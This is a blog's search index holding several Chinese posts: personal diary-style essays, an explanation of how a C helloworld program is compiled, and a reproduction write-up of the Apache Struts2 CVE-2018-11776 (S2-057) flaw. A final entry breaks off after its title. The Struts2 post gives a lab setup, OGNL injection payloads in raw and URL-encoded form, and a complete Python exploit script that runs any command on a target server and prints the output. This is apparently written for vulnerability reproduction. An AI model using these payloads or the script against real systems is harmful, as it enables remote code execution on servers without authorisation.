<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>小心情</title>
      <link href="/2019/08/23/xiaoqiu/"/>
      <url>/2019/08/23/xiaoqiu/</url>
      
        <content type="html"><![CDATA[<blockquote><p>与你分享，最自我的存在，最重要的秘密。<br><img src="http://upload-images.jianshu.io/upload_images/3941016-fe10f7fc79dd1705.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="小秋"></p></blockquote><p>脑海里存在过好多个故事<br>大多包含了我爱你的主题</p><p>它们可能在我想你的某些须臾发生了</p><p>然后消失在我无法说忘记的深深自责里</p><p>偶尔会记录下的都是可以用言语概论的</p><p>在我觉得实在是孤单了喔</p><p>说与 除了你我的爱人们听</p><a id="more"></a><p><img src="http://upload-images.jianshu.io/upload_images/3941016-dbca79068aeaa29b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>我还是喜欢和你面对面交谈</p><p>坐在相同的时间和空间里</p><p>对你感到无语的时候就真的不发一言</p><p>你对我心存怀疑的时候可以看着我的眼睛</p><p>他会告诉你我是个好人以及不愿说出口的我爱你</p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=68450&auto=1&height=66"></iframe><p>喜欢陌生的街区 无知的人行道</p><p>风带过来的都是那些无知人的气味儿</p><p>你敢信么 走在拥挤的人潮中我反而安心</p><p>那些结伴的骑行者他们的欢颜</p><p>风尘仆仆的赶路人</p><p>推着婴儿车的年轻母亲</p><p>我似乎见过无数次这样的面孔</p><p>他们好像发生着同样的故事</p><p>然而生活本就是如此 千篇一律</p><p>那些个学画的日子里</p><p>兴奋失落骄傲迷茫哭泣</p><p>有你 有她们有青春</p><p>想来都是无比珍贵</p><p>细数不尽的</p><p>这个世界上 我最畏惧的就是时间了</p><p>那个傻瓜阿</p><p>“明年我要带着一大束玫瑰花去军队”</p><p>她喊我的名字 说“我决定了”</p><p>我们经常郑重其事地做一些决定</p><p>然而我还是被点燃了</p><p>我幻想幸福的场景美好的结局</p><p>我哭着拥抱她说“为你高兴”</p><p>她轻拍着我的后背</p><p>在我耳边说“你也会等到这一天的。”</p><p>还带着把握住了幸福的女孩应该有的沉稳语调</p><p>早上自然醒</p><p>想到运动会那天</p><p>你把食指贴近嘴唇作出嘘的动作</p><p>脸上还挂着谈话时的笑意</p><p>样子特别好看</p><p>然后就看到你们的实习老师走了过来</p><p>跳远结束的时候</p><p>你屁颠屁颠跑回来</p><p>一脸兴奋说着刚如何摔惨了丢人了</p><p>样子特别可爱</p><p>可不可以借我一个“从此” 我的故事该完结了</p><p>但是 安徒生先生已经把最后一个“从此”也用掉了</p><p>要不你试试看我的“后来”“以后”“最后”或者“然后”</p><p>不了， 看来我只能让我的王子和公主死掉了</p><p><img src="http://upload-images.jianshu.io/upload_images/3941016-bf7aa59fc2d09c00.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>我有时会对自己说，写个故事吧。<br>生活这么无趣，随便写个开头结尾，就能打动人。<br>后来往往无果，因为生活面孔多，生活其实比故事厉害，<br>觉得生活无聊就写不出好看的故事。<br>人为什么会觉得无聊，人们总说，今天简直无聊得要死，<br>这句话其实一点也不夸张啊。<br>有人会选择死亡，要么因为懦弱，他们是被困难打败了；<br>要么就是无聊教唆的，他们无所恋了。<br>我显然还是有所恋的， 就算单恋一个人<br>我也持续了够久。<br>我还是乐意去编织一些乱七八糟的东西，<br>或记录某些真实 给以后。<br>感到无聊的时候，就会把时间奉给想念。<br>离世的长辈，许久未见的朋友，不知去向的故人，<br>不曾相恋的恋人。<br>运气不错的话，过程中就能收获灵感。<br>潜意识里那些想说的话，会在一瞬间，自己就排列组合<br>小跑而来。</p><p>那女人按照惯例，<br>在星期一的早晨，<br>又开始数落起她可怜的丈夫。<br>“我真是受够了，<br>看看你没出息的样子。”<br>她先是重复了上周<br>以及上上周<br>以及上上上周的开场白。<br>他的丈夫沉默不语，<br>或许没听到，因为他正</p><p>“记得把牛奶喝掉，<br>喝完记得把杯子洗干净。<br>我去上班了，<br>这日子简直没法过了。”<br>结束语也一样。</p><p>能随着性子，<br>最终完成一件事。<br>便十分美好。</p><p>朝闻道，夕死可矣。<br>人们想要强调某件事时，<br>总会把话说得极其夸张。</p><p>相对老无所依这样故弄玄虚的电影，<br>还是更喜欢听别人实实在在讲故事。<br>比如一次别离，比如通天塔。<br>它们首先是想好好讲一个好故事，<br>而后希望发人深省产生讨论。<br>它们讲礼貌，是特别有诚意的诉说者。</p><p>我们是动物<br>孤独地过冬<br>春天来了<br>我把自己滚成一个球<br>沿路摘几颗新鲜的酱果<br>赶到你家门口<br>等待你慢慢苏醒的样子<br>你扑腾了几下<br>张开了翅膀<br>看到坐在树下的我<br>你高兴地俯冲下来<br>叼走了我背上的紫色酱果<br>然后飞走了<br>我拾起你掉落的羽毛<br>如获珍宝</p><p>回忆往常日子里<br>所有与你的对视</p><p>夏尔走了之后<br>每个星期都会去镇上喝酒<br>最近去得比较频繁<br>我爱上了一个姑娘<br>每天下午三点<br>她会推着小推车来给酒馆送酒<br>一个月过去夏尔还没有回来<br>我带姑娘回家<br>她自己脱衣服然后洗澡<br>在做第三次的时候她说<br>我知道你不爱我<br>你只不过想讲一个故事</p><p>你连一把好剑都没有<br>你也好意思说自己是行侠仗义的江湖中人<br>那个兜里不过揣了几把小刀的卷卷头竟也嘲笑我<br>当时我也是年轻气盛冲上去几拳把他打倒在地<br>眼看他一脸血我接着用力补了几脚就扬长而去<br>隐约听到围观的人群中传来声音小李小李你没事吧<br>我顾自向前</p><p>她突然说“我妈妈是在酉时生下我的，<br>日落酉时，记住啦，我死了你要告诉道士先生呀”<br>“日落有时？就像现在太阳要下山了吗？”<br>“恩，就是傍晚了，好好记住，他们都不知道，<br>我们家总要有一个人知道。”<br>我突然明白这件事是非常神圣的，<br>那年我六七岁，她只告诉我一个人。<br>就在几年前她离开。<br>非常突然，我们每个人都开始自责。<br>她离开之前，家里还在商量她的99岁大寿。<br>出殡那天，我和姑姑还有另外几个人坐一辆车，<br>有个女人一直大声说笑，吵吵闹闹。<br>我想抽她一耳光。<br>我看着窗外，姑姑搂着我。<br>一直下着小雨。</p><p>小时候第一次在户口簿上看到她的名字<br>我嘲笑她说谁给你取的名字啊张大姐</p><p>也是第一次知道她不姓杨而是姓张</p><p>通常我们坐在一起的时候<br>我不大记得是谁先开口<br>说第一句话</p><p>坐在那里抽烟的男人<br>外套歪躺在沙发上<br>墙脚立着一盆绿植，叶子大而茂盛<br>女人不知去了哪里，菜摆在桌上慢慢凉<br>从窗外飞来一只鸟，横冲直撞<br>男人熄灭了半支的烟，躺在沙发上<br>外套压在身下，露出半只袖<br>鸟儿飞来飞去不觉得累<br>汤面上结起一层油花，女人没有回来<br>而墙角立着一盆绿植<br>鸟儿横冲直撞</p><p>和薇聊了好多，<br>五年内几乎没有联系，<br>我给她讲现在的自己，<br>猛然发现曾经最爱做的事情现在依然，<br>写字画画喜欢kimi。<br>你变了么</p><p>2013.12.16 杭州下雪了<br>和你生活在同一座城市的好处是 感受 同样的天气<br>两点钟的时候 各自发条状态迎接季节赠予的礼物 是的下雪了<br>过去几天的雾霾 似乎对我没什么影响好像事不关己<br>早上下雨 冷 撑一把大大的 枣红色的伞<br>下午坐在寝室看非诚勿扰 窗外 雪很大<br>超美的<br><img src="http://upload-images.jianshu.io/upload_images/3941016-a44b39bbba6cb45a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p>为什么在做事情之前，<br>我不告诉自己，<br>一定要做到最好，<br>要尽到最大的努力去完成。<br>以前总爱顺其自然。<br>我对自己一直很客气，<br>所以我变成特别容易满足的人，<br>对别人也完全没有杀伤力。<br>可能快乐至上吧。<br>失之坦然，得之淡然，处之泰然，顺其自然。<br>并不去给一个对错的判断，快乐就好。<br>最终信仰是：永远忠于自己。</p><p>以前有愿望写故事，<br>以为能像我做其他事情一样顺其自然，<br>没有提纲就这么一味地写，<br>隔半年想再接下去，<br>却发现不能像当初一样随心所欲了。<br>当有无数种可能摆在你面前的时候，<br>你都不知道该如何走向当初设定好的结局。</p><p>我喜欢在家里转圈圈，这样可以带动思考。<br>额(⊙o⊙)…，好吧，我承认我给我的怪癖找了一个冠冕堂皇的借口。</p><p>小时候有暴力倾向。<br>有时认为自己是个自闭症患者。</p><p>大概十一岁的时候我开始懂得构建自己的精神世界，<br>后来开始患得患失，慢慢的，会把自己的情绪放大化，<br>喜欢的人和事物会尤其喜欢，而且持久。</p><p>一生中我们会遇到形形色色的人，<br>入耳许许多多的事，<br>无论你是否主动搭讪这个世界，<br>世界总能带给我们改变。<br>2013年夏天，我在南京。<br>这段旅程蓄谋已久。<br>其然实践起来也并不难，我们甚至连车票都没有提前买好，背着包约定在车站见面。<br>行李简单，拖着一双洞洞鞋，见面是一个不陌生的拥抱。<br>她说的第一句话是，好想你啊。我说的是，好热啊。<br>开玩笑的，你知道我是如此爱你。<br>我相信那些独自旅行的人都是因为找不到合适的伴侣。<br>那个白天我们在图书馆待到闭馆，然后坐着旧巴士穿越了长兴这座小城，从北到南。<br>深夜吃了干挑面，坐在马路边。差不多是凌晨四点的时候，我们坐上了开往南京的火车。<br>从一开始，这段旅程的定义就是要不断给自己找麻烦。<br>八月份，南京，取消青旅预订床位，火车···<br>晚上我们坐在秦淮河旁，有人彻夜聊天，有陌生人和我们坐一桌，扰得我不安稳。<br>有点小雨，我睡着了，她给我支起雨伞，我醒来觉得好笑。<br>且说到这吧。倘若两个人有共同的记忆，一提便会想起来。</p><p>昨天的小清新和之前没写完的故事，就先不分享了。</p><p>该快乐快乐，该烦躁烦躁，建议你快乐</p><p><img src="http://upload-images.jianshu.io/upload_images/3941016-b2b720b0c28be7ee.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> 心情 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 心情 </tag>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>helloworld生命周期</title>
      <link href="/2019/08/21/helloword/"/>
      <url>/2019/08/21/helloword/</url>
      
        <content type="html"><![CDATA[<p>在我们要学习一门编程语言的时候第一个程序基本上是helloworld，但就是这个简单的程序到底是如何运行的，在此做一下记录。<br><img src="https://upload-images.jianshu.io/upload_images/3941016-511f2343273f9a90.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><a id="more"></a><blockquote><p>文章中的部分内容来自《深入理解计算机系统》第一章<br>helloworld  从到创建，执行，输出简单消息，再到终止，中间到底是如何运行的。简单介绍下。</p></blockquote><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class=" language-c"><code class="language-c"> <span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token keyword">const</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">printf</span> <span class="token punctuation">(</span><span class="token string">"hello  world \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="二进制文本"><a href="#二进制文本" class="headerlink" title="二进制文本"></a>二进制文本</h2><ul><li>计算机中，数据的存储我们看到的是一串英文代码，其实存储的是2进制数据，helloworld 程序的代码可以用 ASCLL码表示。再把具体的ASCLL码转为为2进制。</li></ul><p><img src="https://upload-images.jianshu.io/upload_images/3941016-2bd37d49ef16eac2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="16进制的hello.c"></p><ul><li>如图中的23对应的10进制数据为35 而35对应的为#<br><img src="https://upload-images.jianshu.io/upload_images/3941016-a0c71f1f0af07306.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></li></ul><h2 id="程序被其他程序翻译成不同的格式"><a href="#程序被其他程序翻译成不同的格式" class="headerlink" title="程序被其他程序翻译成不同的格式"></a>程序被其他程序翻译成不同的格式</h2><p>hello程序从一个高级的c程序开始因为这样更容易让人读懂。但是如果要运行hello这个程序，必须要转为编译成更低的机器语言。</p><ol><li><p>在Linux 中从源程序到目标程序是由编译器完成的。<br><img src="https://upload-images.jianshu.io/upload_images/3941016-bf20f3ee15935569.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p></li><li><p>可以用file 命令查看目标程序的详细信息</p></li></ol><p><img src="https://upload-images.jianshu.io/upload_images/3941016-be2300fbb8a4d43f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><blockquote><p>可以看出这个程序的格式为elf(对应的Windows下的编译的为pie) 64为程序，因为处理器是向下兼容的如果要生成32位程序可以使用  (-m32)   </p></blockquote><h2 id="在编译中到底经历了哪些阶段"><a href="#在编译中到底经历了哪些阶段" class="headerlink" title="在编译中到底经历了哪些阶段"></a>在编译中到底经历了哪些阶段</h2><p><img src="https://upload-images.jianshu.io/upload_images/3941016-27119309c5367d45.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><ol><li>预处理阶段（cpp）根据以#号开头的命令，修改原始的c程序，比如helloworld 中的第一行 #include&lt;stdio.h&gt;命令告诉预处理器读取系统头文件stdio.h 的内容.并把他直接插入程序文本中，得到一个c程序 ,通常是以 .i 为扩张名。stdio.h 文件在Linux中的（/usr/include目录下) </li></ol><p><img src="https://upload-images.jianshu.io/upload_images/3941016-ac34c48610009d5e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><ol start="2"><li>编译阶段，汇编器(ccl)为把上面的helloworld.i  反义成hello.s他包含一个汇编语言程序，用（ida查看汇编程序）</li></ol><p><img src="https://upload-images.jianshu.io/upload_images/3941016-ca0d9998e651a056.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="IDA查看"></p><p><img src="https://upload-images.jianshu.io/upload_images/3941016-f13d94bc7d0c3e12.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="objdump查看"></p><ol start="3"><li>汇编阶段：把源程序的helloworld.s  翻译成机器语言指令。并将结果保存在  helloworld.o文件中，helloworld.o 是一个2进制文件</li></ol><ol start="4"><li>链接阶段： 源程序中的hellworld 调用了printf 函数  ，他是每一个C 编辑器提供的标准c库中的一个函数，printf 函数存在一个名为printf.o的单独的预编译好的目标文中中，而这个文件必须以某种形式合并到我们helloworld.o程序中链接器(ld)就负责这种合并。结果生产一个可执行的文件为helloworld。</li></ol><h3 id="ida-查看链接的printf-函数"><a href="#ida-查看链接的printf-函数" class="headerlink" title="ida 查看链接的printf 函数"></a>ida 查看链接的printf 函数</h3><p><img src="https://upload-images.jianshu.io/upload_images/3941016-7c820f4d3de67eb6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h2 id="运行helloworld程序："><a href="#运行helloworld程序：" class="headerlink" title="运行helloworld程序："></a>运行helloworld程序：</h2><p><img src="https://upload-images.jianshu.io/upload_images/3941016-07bad11a13279098.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p><img src="https://upload-images.jianshu.io/upload_images/3941016-cc721e884c507feb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p><img src="https://upload-images.jianshu.io/upload_images/3941016-3f2b1409d002282b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> helloworld生命周期 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
            <tag> 计算机系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2018-11776漏洞复现</title>
      <link href="/2019/08/02/CVE-2018-11776%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2019/08/02/CVE-2018-11776%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01 漏洞概述"></a>0x01 漏洞概述</h1><p>2018年8月23日，ApacheStrust2发布最新安全公告，ApacheStruts2 存在远程代码执行的高危漏洞，该漏洞由SemmleSecurity Researchteam的安全研究员汇报，漏洞编号为CVE-2018-11776（S2-057）。</p><p>定义XML配置时如果namespace值未设置且上层动作配置（Action Configuration）中未设置或用通配符namespace时可能会导致远程代码执行。<br>URL标签未设置value和action值且上层动作未设置或用通配符namespace时可能会导致远程代码执行，以及系统命令到服务器系统中去 。</p><hr><h1 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02 影响版本"></a>0x02 影响版本</h1><p>Apache struts 2.3-Apache struts 2.3.34</p><p>Apache struts 2.5-Apache struts 2.5.16 </p><hr><h1 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h1><h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><ul><li>windows 10</li><li>jdk1.8.0_191</li><li>apache-tomcat-7.0.96</li><li>struts-2.3.34</li></ul><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>首先安装jdk，并配置环境变量，不再赘述</p><p>下载 <a href="https://tomcat.apache.org/download-70.cgi" target="_blank" rel="noopener">apache-tomcat</a> 并解压<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190802122817.png" alt></p><p>下载 <a href="http://archive.apache.org/dist/struts/2.3.34/" target="_blank" rel="noopener">Struts-2.3.34</a> 解压，并将apps目录下的 <code>struts2-showcase.war</code> 复制到tomcat的webapps目录下<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190802123100.png" alt></p><p><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190802123449.png" alt></p><p>在tomcat下bin目录下运行startup.bat脚本来启动tomcat，启动后自动部署struts2<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190802123719.png" alt></p><p>浏览器访问 <code>http://127.0.0.1:8080/struts2-showcase</code>，出现如下界面即为部署成功了。<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190802123957.png" alt></p><p>正常部署完成struts如上所示，但为了复现struts2-057漏洞，需要修改如下两个文件（tomcat目录下）</p><ul><li>D:\Program Files\Java\apache-tomcat-7.0.96\webapps\struts2-showcase\WEB-INF\src\java\struts-actionchaining.xml</li><li>D:\Program Files\Java\apache-tomcat-7.0.96\webapps\struts2-showcase\WEB-INF\classes\struts-actionchaining.xml</li></ul><p>注释掉原来的xml代码，修改如下<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190802124843.png" alt></p><pre><code>&lt;struts&gt;    &lt;package name=&quot;actionchaining&quot; extends=&quot;struts-default&quot;&gt;        &lt;action name=&quot;actionChain1&quot; class=&quot;org.apache.struts2.showcase.actionchaining.ActionChain1&quot;&gt;            &lt;result type=&quot;redirectAction&quot;&gt;            &lt;param name = &quot;actionName&quot;&gt;register2&lt;/param&gt;            &lt;/result&gt;            &lt;/action&gt;        &lt;action name=&quot;actionChain2&quot; class=&quot;org.apache.struts2.showcase.actionchaining.ActionChain2&quot;&gt;            &lt;result type=&quot;chain&quot;&gt;actionChain3&lt;/result&gt;        &lt;/action&gt;        &lt;action name=&quot;actionChain3&quot; class=&quot;org.apache.struts2.showcase.actionchaining.ActionChain3&quot;&gt;            &lt;result&gt;/WEB-INF/actionchaining/actionChainingResult.jsp&lt;/result&gt;        &lt;/action&gt;    &lt;/package&gt;&lt;/struts&gt;</code></pre><p>在tomcat下bin目录下运行shutdown.bat，startup.bat脚本来重启tomcat。<br><strong>重启tomcat！！！</strong><br><strong>重启tomcat！！！</strong><br><strong>重启tomcat！！！</strong><br>浏览器访问<code>http://192.168.10.230:8080/struts2-showcase/</code>,漏洞环境成功搭建</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>在URL构造ognl表达式，再加上配置文件中的action标签中的name属性值，并以.action结尾<br><code>http://127.0.0.1:8080/struts2-showcase/${(50+50)}/actionChain1.action</code><br>执行完成之后发现跳转到了<br><code>http://127.0.0.1:8080/struts2-showcase/100/register2.action</code><br>执行了ognl 表达式 ${(50+50)},漏洞存在</p><p>进一步利用漏洞，弹出计算器，构造payload</p><pre><code>${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request[&#39;struts.valueStack&#39;].context).(#cr=#ct[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#cmd=@java.lang.Runtime@getRuntime().exec(&quot;calc&quot;))}</code></pre><p>进行URL编码 </p><pre><code>%24%7b%28%23%64%6d%3d%40%6f%67%6e%6c%2e%4f%67%6e%6c%43%6f%6e%74%65%78%74%40%44%45%46%41%55%4c%54%5f%4d%45%4d%42%45%52%5f%41%43%43%45%53%53%29%2e%28%23%63%74%3d%23%72%65%71%75%65%73%74%5b%27%73%74%72%75%74%73%2e%76%61%6c%75%65%53%74%61%63%6b%27%5d%2e%63%6f%6e%74%65%78%74%29%2e%28%23%63%72%3d%23%63%74%5b%27%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%41%63%74%69%6f%6e%43%6f%6e%74%65%78%74%2e%63%6f%6e%74%61%69%6e%65%72%27%5d%29%2e%28%23%6f%75%3d%23%63%72%2e%67%65%74%49%6e%73%74%61%6e%63%65%28%40%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%6f%67%6e%6c%2e%4f%67%6e%6c%55%74%69%6c%40%63%6c%61%73%73%29%29%2e%28%23%6f%75%2e%67%65%74%45%78%63%6c%75%64%65%64%50%61%63%6b%61%67%65%4e%61%6d%65%73%28%29%2e%63%6c%65%61%72%28%29%29%2e%28%23%6f%75%2e%67%65%74%45%78%63%6c%75%64%65%64%43%6c%61%73%73%65%73%28%29%2e%63%6c%65%61%72%28%29%29%2e%28%23%63%74%2e%73%65%74%4d%65%6d%62%65%72%41%63%63%65%73%73%28%23%64%6d%29%29%2e%28%23%63%6d%64%3d%40%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%40%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%22%29%29%7d</code></pre><p>拼接</p><pre><code>127.0.0.1:8080/struts2-showcase/%24%7b%28%23%64%6d%3d%40%6f%67%6e%6c%2e%4f%67%6e%6c%43%6f%6e%74%65%78%74%40%44%45%46%41%55%4c%54%5f%4d%45%4d%42%45%52%5f%41%43%43%45%53%53%29%2e%28%23%63%74%3d%23%72%65%71%75%65%73%74%5b%27%73%74%72%75%74%73%2e%76%61%6c%75%65%53%74%61%63%6b%27%5d%2e%63%6f%6e%74%65%78%74%29%2e%28%23%63%72%3d%23%63%74%5b%27%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%41%63%74%69%6f%6e%43%6f%6e%74%65%78%74%2e%63%6f%6e%74%61%69%6e%65%72%27%5d%29%2e%28%23%6f%75%3d%23%63%72%2e%67%65%74%49%6e%73%74%61%6e%63%65%28%40%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%6f%67%6e%6c%2e%4f%67%6e%6c%55%74%69%6c%40%63%6c%61%73%73%29%29%2e%28%23%6f%75%2e%67%65%74%45%78%63%6c%75%64%65%64%50%61%63%6b%61%67%65%4e%61%6d%65%73%28%29%2e%63%6c%65%61%72%28%29%29%2e%28%23%6f%75%2e%67%65%74%45%78%63%6c%75%64%65%64%43%6c%61%73%73%65%73%28%29%2e%63%6c%65%61%72%28%29%29%2e%28%23%63%74%2e%73%65%74%4d%65%6d%62%65%72%41%63%63%65%73%73%28%23%64%6d%29%29%2e%28%23%63%6d%64%3d%40%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%40%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%22%29%29%7d/actionChain1.action</code></pre><p>成功执行<br><img src="https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20190802131043.png" alt></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre><code>#coding: utf-8#! python2import requestsimport sysdef expliot(host, command, path):    &#39;&#39;&#39;    2.3.34版本    payload1:    ${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request[&#39;struts.valueStack&#39;].context).(#cr=#ct[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#w=#ct.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;ipconfig&#39;).getInputStream()))).(#w.close())}    2.3.20版本    payload2:    ${(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#w=#context.get(&quot;com.opensymphony.xwork2.dispatcher.HttpServletResponse&quot;).getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;ipconfig&#39;).getInputStream()))).(#w.close())}    &#39;&#39;&#39;    str1 = &quot;${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request[&#39;struts.valueStack&#39;].context).(#cr=#ct[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#w=#ct.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;).getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;&quot; + command + &quot;&#39;).getInputStream()))).(#w.close())}&quot;    str1 = str1.encode(&#39;hex&#39;)    str2 = &quot;${(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#w=#context.get(&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;).getWriter()).(#w.print(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;&quot; + command + &quot;&#39;).getInputStream()))).(#w.close())}&quot;    str2 = str2.encode(&#39;hex&#39;)    # 需要进行URL编码    payload1 = &quot;&quot;    for i in range(0, len(str1), 2):        payload1 += &#39;%&#39; + str1[i:i + 2]    payload2 = &quot;&quot;    for i in range(0, len(str2), 2):        payload2 += &#39;%&#39; + str2[i:i + 2]    url1 = host + &#39;/&#39; + payload1 + &#39;/&#39; + path    url2 = host + &#39;/&#39; + payload2 + &#39;/&#39; + path    res1 = requests.get(url1, allow_redirects=False)    res2 = requests.get(url2, allow_redirects=False)    if res1.status_code == 200 and res2.status_code != 200:        print(&quot;Exploit successful:&quot;)        print(res1.content)    elif res2.status_code == 200 and res1.status_code != 200:        print(&quot;Exploit successful:&quot;)        print(res2.content)    else:        print(&#39;The target is likely unvulnerable,mabye your struts2 version is too high!&#39;)if __name__ == &#39;__main__&#39;:    if len(sys.argv) &lt; 4:        print(&quot;Usage: python s2-057-exp.py http://www.xxx.com/ {command} {The path such as:actionChain1.action}&quot;)    else:        expliot(sys.argv[1].strip(), sys.argv[2], sys.argv[3].strip())</code></pre><p>使用方法：</p><p><code>python2 struts2.py http://www.xxx.com/ {command} {The path such as:actionChain1.action}</code></p><p>例如:<br><code>python2 struts2.py http://192.168.50.197:8080/struts2-showcase/ &quot;ipconfig&quot; actionChain1.action</code></p><hr><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="http://www.cuittk.cn/2019/01/02/CVE-2018-11776漏洞从搭建到复现/" target="_blank" rel="noopener">CVE-2018-11776漏洞从搭建到复现</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
            <tag> CVE-2018-11776 </tag>
            
            <tag> struts2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nessus与awvs API</title>
      <link href="/2019/08/02/scan/"/>
      <url>/2019/08/02/scan/</url>
      
